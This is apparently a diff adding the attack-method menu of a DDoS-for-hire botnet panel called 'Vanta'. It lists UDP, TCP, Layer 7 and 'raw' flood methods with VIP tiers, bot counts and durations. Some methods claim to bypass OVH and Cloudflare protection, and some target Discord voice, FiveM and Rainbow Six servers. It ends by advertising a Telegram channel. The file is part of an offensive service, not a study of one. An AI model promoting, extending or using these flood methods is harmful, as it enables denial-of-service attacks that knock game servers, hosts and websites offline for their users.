@@ -1,0 +1,32 @@
+ [ User Datagram Protocol ]
+NaN| dns               Domain Name System amplification flood (DNS)                       400s| CIDR █
+NaN| udp               Basic UDP flood sending default & custom parameters with high gigs 400s| CIDR █
+NaN| udpbypass         High rate udp flood sending different bypasses with high pps       400s| CIDR █
+VIP| pps-vip           raw pps flood using default len=1 + bots=1000                      400s| CIDR █
+VIP| udp-vip           Mixed udpplain & spoof flood using custom parameters               400s| CIDR █
+ [ Transmission Control Protocol ]
+NaN| stomp             Legit TCP Data + randomized proxied SYN / DATA Variants            400s| CIDR █
+NaN| ovh               Valid OVH bypass using PSH, ACK & proxied 3 way handshake          400s| CIDR █
+VIP| socket            Valid TCP flood for MASS open connections low GBP'S                400s| CIDR █
+VIP| tfo                   Sending Fast Open Cookie Flood + randomized options            400s| CIDR █
+NaN| tcpbypass               Sending Legit TCP Data + randomized SYN Flags                400s| CIDR █
+VIP| tcp-vip                   Raw TCP flood sending randomized flags & low len           400s| CIDR █
+ [ Game Methods ]
+NaN| discord           Custom UDP payload based for DISCORDS VOIP servers                 400s| CIDR █
+NaN| fivem             Dynamic Query AUTH flood using static login tokens                 400s| CIDR █
+VIP| game              Custom UDP flood designed for all games sending low packets        400s| CIDR █
+ [ Layer 7 Methods ]
+VIP| https-vanta      Node.js HTTP/2 Universal Bypass flood GEAD + GET & LOW HTTP-DDOS    400s| CIDR █
+VIP| browser    Node.js HTTP/2 Cookie cloudflare bypass EXPLOIT = 0% HTTP-DDOS, emulation 400s| CIDR █
+NaN| tls               Node.js HTTP/2 flood using TLS queries w randomized user agents    400s| CIDR █
+NaN| https             Node.js HTTP/2 / 1.1 Mass user agents Flood using GET + HEAD       400s| CIDR █
+ [ Raw  Methods ]
+RAW| !udpplain        Raw Udpplain using high len len=1400 with randomized options         60s| CIDR █
+RAW| !stomp       Raw Stomp Sending PSH+ACK Flags                                          60s| CIDR █
+RAW| !pps        Raw pps sending len=1 with bots=25000                                     60s| CIDR █
+RAW| !r6         R6 method crashing ranked qm, sending queries with low len for pps        60s| CIDR █
+RAW| !udp         Simple Raw UDP flood with high len + randomized bots.                    60s| CIDR █
+RAW| !socket         3way tcp handshake sending SYN+ACK to kill ports.                     60s| CIDR █
+════════════════════════════════════╤══════════════════════════════════════╤═════════════════════════════════╤
+    Type "help" to view Commands    │  Join Telegram: t.me/redirect_vanta  │  Type A or Addons To View Addons│
+════════════════════════════════════╧══════════════════════════════════════╧═════════════════════════════════╧
